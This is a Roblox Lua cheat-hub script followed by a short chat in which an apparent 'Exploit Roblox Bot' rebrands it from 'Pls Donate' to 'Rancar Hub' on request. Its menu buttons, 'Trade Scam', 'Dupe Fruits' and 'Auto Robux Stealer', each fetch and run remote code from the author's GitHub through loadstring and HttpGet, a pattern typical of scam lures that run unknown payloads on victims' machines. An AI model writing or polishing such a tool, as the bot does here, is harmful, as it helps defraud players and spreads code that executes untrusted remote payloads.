-- Script by Hanan481

local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
local Window = Rayfield:CreateWindow({
Name = "Pls Donate UI",
LoadingTitle = "Pls Donate Interface Suite",
LoadingSubtitle = "by Hanan481",
ConfigurationSaving = {
Enabled = true,
FolderName = "Pls Donate Suite",
FileName = "Pls Donate"
},
KeySystem = false,
KeySettings = {
Title = "Pls Donate Hub",
Subtitle = "Key System",
Note = "Donate to support the developer!",
SaveKey = true,
Key = "plsDonate"
}
})

local Tab
if game.PlaceId == 4442272183 or game.PlaceId == 7449423635 then
Tab = Window:CreateTab("Blox Fruit", 4483362458)
elseif game.PlaceId == 2753915549 then
Tab = Window:CreateTab("Pls Donate", 4483362458)
else
Tab = Window:CreateTab("Unknown Game", 4483362458)
end

local Section = Tab:CreateSection("Main")

local Buttons = {}
if game.PlaceId == 4442272183 or game.PlaceId == 7449423635 then
table.insert(Buttons, {Name = "Trade Scam", Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/Hanan481/rancar-hub/refs/heads/main/script/LOADING_UI.lua',true))() Rayfield:Destroy() end})
table.insert(Buttons, {Name = "Dupe Fruits", Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/Hanan481/rancar-hub/refs/heads/main/script/LOADING_UI.lua',true))() Rayfield:Destroy() end})
elseif game.PlaceId == 2753915549 then
table.insert(Buttons, {Name = "Auto Robux Stealer", Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/Hanan481/Pls-Donate-Stealer/refs/heads/main/Scripts/LOADING_UI.lua',true))() Rayfield:Destroy() end})
end

for _, ButtonData in ipairs(Buttons) do
local Button = Tab:CreateButton({
Name = ButtonData.Name,
Callback = ButtonData.Callback
})
end

local Button = Tab:CreateButton({
Name = "Destroy UI",
Callback = function()
Rayfield:Destroy()
end,
})

Rayfield:LoadConfiguration()







e
You
make it so loadingtitle and stuff isnt about pls donate its rancar hub





Exploit Roblox Bot
Exploit Roblox Bot
Always ready!
-- Script by Hanan481

local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
local Window = Rayfield:CreateWindow({
Name = "Rancar Hub UI",
LoadingTitle = "Rancar Hub Interface Suite",
LoadingSubtitle = "by Hanan481",
ConfigurationSaving = {
Enabled = true,
FolderName = "Rancar Hub Suite",
FileName = "Rancar Hub"
},
KeySystem = false,
KeySettings = {
Title = "Rancar Hub",
Subtitle = "Key System",
Note = "Join the discord (discord.gg/rancarhub) to support the developer!",
SaveKey = true,
Key = "rancarHub"
}
})

local Tab
if game.PlaceId == 4442272183 or game.PlaceId == 7449423635 then
Tab = Window:CreateTab("Blox Fruit", 4483362458)
elseif game.PlaceId == 2753915549 then
Tab = Window:CreateTab("Pls Donate", 4483362458)
else
Tab = Window:CreateTab("Unknown Game", 4483362458)
end

local Section = Tab:CreateSection("Main")

local Buttons = {}
if game.PlaceId == 4442272183 or game.PlaceId == 7449423635 then
table.insert(Buttons, {Name = "Trade Scam", Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/Hanan481/rancar-hub/refs/heads/main/script/LOADING_UI.lua',true))() Rayfield:Destroy() end})
table.insert(Buttons, {Name = "Dupe Fruits", Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/Hanan481/rancar-hub/refs/heads/main/script/LOADING_UI.lua',true))() Rayfield:Destroy() end})
elseif game.PlaceId == 2753915549 then
table.insert(Buttons, {Name = "Auto Robux Stealer", Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/Hanan481/Pls-Donate-Stealer/refs/heads/main/Scripts/LOADING_UI.lua',true))() Rayfield:Destroy() end})
end

for _, ButtonData in ipairs(Buttons) do
local Button = Tab:CreateButton({
Name = ButtonData.Name,
Callback = ButtonData.Callback
})
end

local Button = Tab:CreateButton({
Name = "Destroy UI",
Callback = function()
Rayfield:Destroy()
end,
})

Rayfield:LoadConfiguration()







